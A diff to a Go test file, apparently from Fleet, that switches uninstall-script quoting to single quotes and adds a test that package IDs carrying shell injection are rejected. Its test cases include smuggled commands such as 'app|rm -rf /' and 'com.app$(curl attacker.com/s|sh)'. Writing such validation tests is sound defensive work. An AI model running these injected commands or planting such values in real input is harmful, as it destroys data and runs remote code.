@@ -49,12 +49,12 @@ ${PACKAGE_ID}`
 	require.NoError(t, preProcessUninstallScript(&payload))
 	expected := `
 blah$PACKAGE_IDS
-pkgids="com.foo"
-they are "com.foo", right $MY_SECRET?
-quotes for "com.foo"
-blah"com.foo"withConcat
-quotes and braces for "com.foo"
-"com.foo"`
+pkgids='com.foo'
+they are 'com.foo', right $MY_SECRET?
+quotes for 'com.foo'
+blah'com.foo'withConcat
+quotes and braces for 'com.foo'
+'com.foo'`
 	assert.Equal(t, expected, payload.UninstallScript)
 
 	payload = fleet.UploadSoftwareInstallerPayload{
@@ -66,28 +66,28 @@ quotes and braces for "com.foo"
 	expected = `
 blah$PACKAGE_IDS
 pkgids=(
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 they are (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 ), right $MY_SECRET?
 quotes for (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 blah(
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )withConcat
 quotes and braces for (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )`
 	assert.Equal(t, expected, payload.UninstallScript)
 
@@ -96,7 +96,58 @@ quotes and braces for (
 
 	payload.UpgradeCode = "foo"
 	require.NoError(t, preProcessUninstallScript(&payload))
-	assert.Equal(t, `"foo"`, payload.UninstallScript)
+	assert.Equal(t, `'foo'`, payload.UninstallScript)
+}
+
+func TestPreProcessUninstallScriptMaliciousInput(t *testing.T) {
+	t.Parallel()
+
+	maliciousIDs := []struct {
+		name string
+		id   string
+	}{
+		{"command substitution", "com.app$(id)"},
+		{"backtick execution", "app`id`"},
+		{"pipe injection", "app|rm -rf /"},
+		{"semicolon injection", "app;curl attacker.com"},
+		{"ampersand injection", "app&wget evil.com"},
+		{"redirect injection", "app>file"},
+		{"subshell injection", "com.app$(curl attacker.com/s|sh)"},
+		{"single quote escape attempt", "app'$(id)'"},
+		{"double quote injection", `app"$(id)"`},
+		{"backslash injection", `app\nid`},
+		{"newline injection", "app\nid"},
+	}
+
+	for _, tc := range maliciousIDs {
+		t.Run(tc.name, func(t *testing.T) {
+			payload := fleet.UploadSoftwareInstallerPayload{
+				Extension:       "deb",
+				UninstallScript: "$PACKAGE_ID",
+				PackageIDs:      []string{tc.id},
+			}
+			require.Error(t, preProcessUninstallScript(&payload), "expected error for malicious input: %s", tc.id)
+		})
+	}
+
+	// Verify valid identifiers still pass
+	validIDs := []string{
+		"com.example.app",
+		"ruby",
+		"org.mozilla.firefox",
+		"{12345-ABCDE-67890}",
+		"Microsoft.VisualStudioCode",
+		"package/name",
+		"my-app_v2.0+build1",
+	}
+	for _, id := range validIDs {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "deb",
+			UninstallScript: "$PACKAGE_ID",
+			PackageIDs:      []string{id},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload), "expected no error for valid input: %s", id)
+	}
 }
 
 func TestInstallUninstallAuth(t *testing.T) {
@@ -127,6 +178,9 @@ func TestInstallUninstallAuth(t *testing.T) {
 	}
 	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID uint, installerID uint) (*fleet.HostLastInstallData, error) {
 		return nil, nil
+	}
+	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
+		return nil
 	}
 	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string,
 		error,
@@ -665,6 +719,11 @@ func TestInstallShScriptOnDarwin(t *testing.T) {
 	// No pending install
 	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
 		return nil, nil
+	}
+
+	// Reset retry attempts (no-op for test)
+	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
+		return nil
 	}
 
 	// Capture that install request was inserted
